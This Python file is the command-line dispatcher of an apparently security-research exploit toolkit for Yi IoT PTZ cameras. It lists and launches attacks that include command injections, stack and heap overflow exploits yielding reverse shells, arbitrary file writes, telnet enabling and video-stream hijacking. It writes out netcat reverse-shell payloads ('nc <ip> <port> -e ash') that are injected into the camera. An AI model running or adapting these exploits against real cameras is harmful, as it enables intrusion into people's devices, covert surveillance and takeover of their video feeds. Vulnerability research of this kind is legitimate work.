import sys
import argparse
from pwn import *
from daemon import *
from libcloudapi import *
from libyip2p import *
from util import *
from stream import *
from sdcard import *

def print_ascii_art():
    ascii_art = """
\033[38;5;45m     :::   ::: :::::::::::              :::    :::     :::     :::       ::: \033[0m
\033[38;5;81m    :+:   :+:     :+:                  :+:    :+:   :+: :+:   :+:       :+:  \033[0m
\033[38;5;81m    +:+ +:+      +:+                  +:+    +:+  +:+   +:+  +:+       +:+   \033[0m
\033[38;5;117m    +#++:       +#+    +++++++++++   +#++:++#++ +#+#++##+:+ +#+  +:+  +#+    \033[0m
\033[38;5;117m    +#+        +#+                  +#+    +#+ +#+     +#+ +#+ +#+#+ +#+     \033[0m
\033[38;5;153m   #+#        #+#                  #+#    #+# #+#     #+#  #+#+# #+#+#       \033[0m
\033[38;5;153m  ###    ###########              ###    ### ###     ###   ###   ###         \033[0m

    \033[38;5;240mA suite of tools for PTZ cameras that utilise the Yi IoT app 
                       (6.0.05.10_202301061607)\033[0m
"""

    print(ascii_art)


def main():
    print_ascii_art()

    # define main parser
    parser = argparse.ArgumentParser()
    parser.add_argument("-cam_ip",
                    type=str,
                    required=False,
                    help="IP of the camera",
                    default="192.168.10.1")

    subparsers = parser.add_subparsers(dest='command', help='Available functions')

    # define parser for ap_bind command
    ap_bind_parser = subparsers.add_parser('ap_bind', 
                    help='\033[38;5;240m[6000]\033[0m \033[38;5;31m[INTERACT]\033[0m \
                    Binds to wifi access point with provided credentials')
    ap_bind_parser.add_argument("ssid",
                    type=str,
                    help="SSID of AP camera will bind")
    ap_bind_parser.add_argument("pwd",
                    type=str,
                    help="Password of AP camera will bind")
    ap_bind_parser.add_argument("bind_key",
                    type=str,
                    help="Bind key to use")
    
    # define parser for ap_log command
    ap_log_parser = subparsers.add_parser('ap_log', 
                    help='\033[38;5;240m[6000]\033[0m \033[38;5;31m[INFO]\033[0m Would \
                    return log info, file not present so causes crash')
    
    # define parser for ap_preview command
    ap_preview_parser = subparsers.add_parser('ap_preview',
                    help='\033[38;5;240m[6000]\033[0m \033[38;5;31m[INFO]\033[0m \
                    Returns some device details used for local hotspot connection')
    
    # define ap_update_name_cmd_injection_parser
    ap_update_name_cmd_injection_parser = subparsers.add_parser('ap_update_name_cmd_injection', 
                    help='\033[38;5;240m[6000]\033[0m \033[38;5;31m[REVSHELL]\033[0m \
                    Exploits command injection in ap_update_name for reverse shell')
    ap_update_name_cmd_injection_parser.add_argument("ip",
                    type=str,
                    help="IP for reverse shell to connect")
    ap_update_name_cmd_injection_parser.add_argument("port",
                    type=str,
                    help="Port to use for reverse shell")
    
    # define ap_update_name_file_write_parser
    ap_update_name_file_write_parser = subparsers.add_parser('ap_update_name_file_write', 
                    help='\033[38;5;240m[6000]\033[0m \033[38;5;31m[FILE-WRITE]\033[0m \
                    Exploits the fact that files arent delete if update file check fails, \
                    writes to /tmp')
    ap_update_name_file_write_parser.add_argument("filename",
                    type=str,
                    help="Path of the file (from the current directory) you wish to write to /tmp")
    
    # define ap_update_name_file_write_sd_parser
    ap_update_name_file_write_sd_parser = subparsers.add_parser('ap_update_name_file_write_sd', 
                    help='\033[38;5;240m[6000]\033[0m \033[38;5;31m[FILE-WRITE]\033[0m Exploits \
                    the fact that files arent delete if update file check fails and can do \
                    directory traversal, writes to /mnt')
    ap_update_name_file_write_sd_parser.add_argument("filename",
                    type=str,
                    help="Path of the file (from the current directory) you wish to write to /mnt")
    
    
    # define daemon_cmd_injection_parser
    daemon_cmd_injection_parser = subparsers.add_parser('daemon_cmd_injection', 
                    help='\033[38;5;240m[6789]\033[0m \033[38;5;31m[REVSHELL]\033[0m Exploits \
                    mishandling of the second filename argument in daemon packet for a command injection')
    daemon_cmd_injection_parser.add_argument("ip",
                    type=str,
                    help="IP for reverse shell to connect")
    daemon_cmd_injection_parser.add_argument("port",
                    type=str,
                    help="Port to use for reverse shell")
    
    # define daemon_global_stack_overflow_exploit_parser
    daemon_global_stack_overflow_exploit_parser = subparsers.add_parser('daemon_global_stack_overflow_exploit', 
                    help='\033[38;5;240m[6789]\033[0m \033[38;5;31m[REVSHELL]\033[0m Exploits stack\
                    overflow in daemon for reverse shell on port, uses a global overflow to leak libc address')
    daemon_global_stack_overflow_exploit_parser.add_argument("ip",
                    type=str,
                    help="IP for reverse shell to connect")
    daemon_global_stack_overflow_exploit_parser.add_argument("port",
                    type=str,
                    help="Port to use for reverse shell")
    
    # define daemon_global_stack_overflow_exploit_parser
    daemon_ftp_stack_overflow_exploit_parser = subparsers.add_parser('daemon_ftp_stack_overflow_exploit', 
                    help='\033[38;5;240m[6789]\033[0m \033[38;5;31m[REVSHELL]\033[0m Exploits stack overflow\
                    in daemon for reverse shell on port 123, uses FTP server to get libc address')
    daemon_ftp_stack_overflow_exploit_parser.add_argument("ip",
                    type=str,
                    help="IP for reverse shell to connect")
    daemon_ftp_stack_overflow_exploit_parser.add_argument("port",
                    type=str,
                    help="Port to use for reverse shell")
    
    # define anyka_get_ipc_parser
    anyka_get_ipc_parser = subparsers.add_parser('anyka_get_ipc', 
                    help='\033[38;5;240m[8192]\033[0m \033[38;5;31m[INFO]\033[0m Fetch device details from port 8192')
    
    # define sonic_bug_1_hook_gen_parser
    sonic_bug_1_hook_gen_parser = subparsers.add_parser('sonic_bug_1_hook_gen', 
                    help='\033[38;5;240m[SONIC]\033[0m \033[38;5;31m[PoC]\033[0m Get frida hook to exploit sonic pair \
                    stack overflow to turn on light')
    
    # define sonic_bug_2_hook_gen_parser
    sonic_bug_2_hook_gen_parser = subparsers.add_parser('sonic_bug_2_hook_gen', 
                    help='\033[38;5;240m[SONIC]\033[0m \033[38;5;31m[PoC]\033[0m Get frida hook to cause sonic pair \
                    global overflow, enabling telnet on the camera')
    
    # define set_ap_mode_exploit_parser
    set_ap_mode_exploit_parser = subparsers.add_parser('set_ap_mode_exploit', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[REVSHELL]\033[0m Exploit USER_IPCAM_SET_AP_MODE_REQ \
                    stack overflow for reverse shell')
    set_ap_mode_exploit_parser.add_argument("ip",
                    type=str,
                    help="IP for reverse shell to connect")
    set_ap_mode_exploit_parser.add_argument("port",
                    type=str,
                    help="Port to use for reverse shell")
    
    # define device_param_exploit_parser
    device_param_exploit_parser = subparsers.add_parser('device_param_exploit', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[REVSHELL]\033[0m Uses the below heap overflow to \
                    trigger stack overflow in IOTYPE_USER_IPCAM_GET_DEVICE_PARAM_REQ for reverse shell')
    device_param_exploit_parser.add_argument("ip",
                    type=str,
                    help="IP for reverse shell to connect")
    device_param_exploit_parser.add_argument("port",
                    type=str,
                    help="Port to use for reverse shell")

    # define msg_notice_to_ex_cmd_injection_parser
    msg_notice_to_ex_cmd_injection_parser = subparsers.add_parser('msg_notice_to_ex_cmd_injection', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[REVSHELL]\033[0m Exploit command injection in \
                    callback function for reverse shell (NOTE: bit of a pain as need to set valid time, and device \
                    key is needed)')
    msg_notice_to_ex_cmd_injection_parser.add_argument("ip",
                    type=str,
                    help="IP for reverse shell to connect")
    msg_notice_to_ex_cmd_injection_parser.add_argument("port",
                    type=str,
                    help="Port to use for reverse shell")
    msg_notice_to_ex_cmd_injection_parser.add_argument("device_key",
                    type=str,
                    help="The device key (fetch from )")
    
    # define swt_wifi_info_exploit_parser
    set_wifi_info_exploit_parser = subparsers.add_parser('set_wifi_info_exploit', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[CMD]\033[0m Exploit IOTYPE_USER_IPCAM_SET_WIFI_INFO \
                    stack overflow and run command')
    
    # define set_device_param_global_poc_parser
    set_device_param_global_poc_parser = subparsers.add_parser('set_device_param_global_poc', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[PoC]\033[0m PoC to demonstrate heap overflow in \
                    IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ')
    
    # define cmd_parser
    cmd_parser = subparsers.add_parser('cmd', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[INTERACT]\033[0m Execute control command')
    
    # define cmd subparsers
    cmd_subparsers = cmd_parser.add_subparsers(dest='function', help='Available functions')
    light_parser = cmd_subparsers.add_parser('light', help='control the light')
    light_parser.add_argument("state",
                    type=str,
                    help="light setting",
                    choices=['on', 'off'])

    move_parser = cmd_subparsers.add_parser('move', help='control camera movement')
    move_parser.add_argument("dir",
                    type=str,
                    help="direction setting",
                    choices=['left', 'right', 'up', 'down', 'stop'])

    jump_parser = cmd_subparsers.add_parser('jump', help='jump to position')
    jump_parser.add_argument("vertical",
                    type=int,
                    help="vertical point")
    jump_parser.add_argument("horizontal",
                    type=int,
                    help="horizontal point")

    restart_parser = cmd_subparsers.add_parser('restart', help='restart the camera')

    get_device_param_parser = cmd_subparsers.add_parser('get_device_param', help='fetch the device hardware string')

    set_device_param_parser = cmd_subparsers.add_parser('set_device_param', help='set the device hardware string')
    set_device_param_parser.add_argument("device_param",
                    type=str,
                    help="device hardware string to set")

    get_device_info_parser = cmd_subparsers.add_parser('get_device_info', help='fetch and parse device info string')

    get_version_parser = cmd_subparsers.add_parser('get_version', help='fetch device version string')
    
    # define stream_parser
    stream_parser = subparsers.add_parser('stream', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[INTERACT]\033[0m Display the camera \
                    stream using ffplay')
    
    # define hijack_parser
    hijack_parser = subparsers.add_parser('hijack', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[INTERACT]\033[0m Remotely hijack the \
                    video stream, only works locally')
    hijack_parser.add_argument("output",
                    type=str,
                    help="what we will overwrite the screen with",
                    choices=["flash", "max", "hackerman", "bongo", "wargames"])
    
    # define doom_parser
    doom_parser = subparsers.add_parser('doom', 
                    help='\033[38;5;240m[32100]\033[0m \033[38;5;31m[DOOM]\033[0m Uploads pre-compiled \
                    binary and doom wad, uses cmd injection to start doom, then hijacks anyka_ipc to replace \
                    stream with doom frame buffer, then views stream')
    
    # define event_db_overflow_poc_parser
    event_db_overflow_poc_parser = subparsers.add_parser('event_db_overflow_poc', 
                    help='\033[38;5;240m[SD CARD]\033[0m \033[38;5;31m[PoC]\033[0m Generates a file that \
                    causes a crash when SD card put into device and IOTYPE_USER_IPCAM_GET_ALARM_EVENT_LIST_REQ \
                    command sent with min and max limits')

    arguments = parser.parse_args()

    # version = handle_get_version_command()

    if arguments.command == 'ap_bind':
        ap_bind(arguments.ssid, arguments.pwd, arguments.bind_key)
    elif arguments.command == 'ap_log':
        ap_log()
    elif arguments.command == 'ap_preview':
        ap_preview()
    elif arguments.command == 'ap_update_name_cmd_injection':
        ap_update_name_cmd_injection(arguments.ip, arguments.port, f"nc {arguments.ip} {arguments.port} -e ash")
    elif arguments.command == 'ap_update_name_file_write':
        ap_update_name_file_write(arguments.filename)
    elif arguments.command == 'ap_update_name_file_write_sd':
        ap_update_name_file_write_sd(arguments.filename)
    elif arguments.command == 'daemon_cmd_injection':
        daemon_cmd_injection(f"nc {arguments.ip} {arguments.port} -e ash")
    elif arguments.command == 'daemon_global_stack_overflow_exploit':
        daemon_global_stack_overflow_exploit(arguments.ip, arguments.port)
    elif arguments.command == 'daemon_ftp_stack_overflow_exploit':
        daemon_ftp_stack_overflow_exploit(arguments.ip, arguments.port)
    elif arguments.command == 'anyka_get_ipc':
        anyka_get_ipc()
    elif arguments.command == 'set_ap_mode_exploit':
        exploit_IOTYPE_USER_IPCAM_SET_AP_MODE_REQ_stack_overflow(arguments.ip, arguments.port)
    elif arguments.command == 'device_param_exploit':
        exploit_IOTYPE_USER_IPCAM_SET_DEVICE_PARAM_REQ_global_stack_overflow(arguments.ip, arguments.port)
    elif arguments.command == 'msg_notice_to_ex_cmd_injection':
        exploit_MSG_NOTICE_TO_EX_cmd_injection(arguments.ip, arguments.port, arguments.device_key)
    elif arguments.command == 'set_wifi_info_exploit':
        exploit_IOTYPE_USER_IPCAM_SET_WIFI_INFO_stack_overflow()
    elif arguments.command == 'set_device_param_global_poc':
        set_device_param_poc()
    elif arguments.command == 'cmd':
        if (arguments.function == 'light'):
            handle_light_command(arguments.state)
        if (arguments.function == 'move'):
            handle_move_command(arguments.dir)
        if (arguments.function == 'jump'):
            handle_jump_command(arguments.vertical, arguments.horizontal)
        if (arguments.function == 'restart'):
            handle_restart_command()
        if (arguments.function == 'get_device_param'):
            handle_get_device_param_command()
        if (arguments.function == 'set_device_param'):
            handle_set_device_param_command("HW=" + arguments.device_param + "\n")
        if (arguments.function == 'get_device_info'):
            handle_get_device_info_command()
        if (arguments.function == 'get_version'):
            handle_get_version_command()
    elif arguments.command == 'sonic_bug_1_hook_gen':
        generate_sonic_bug_1_overflow_frida_hook()
    elif arguments.command == 'sonic_bug_2_hook_gen':
        generate_sonic_bug_2_overflow_frida_hook()
    elif arguments.command == 'stream':
        start_stream()
    elif arguments.command == 'hijack':
        hijack_camera_stream(arguments.output)
    elif arguments.command == 'doom':
        ap_update_name_file_write("doom/doom1.wad")
        sleep(5)
        ap_update_name_file_write("doom/doom")
        sleep(5)
        daemon_cmd_injection(f"/tmp/doom -iwad /tmp/doom1.wad")
        sleep(5)
        hijack_camera_stream("doom")
        # sleep(2)
        # start_stream()
    elif arguments.command == 'event_db_overflow_poc':
        event_db_poc()

    exit(0)

if __name__ == "__main__":
    main()
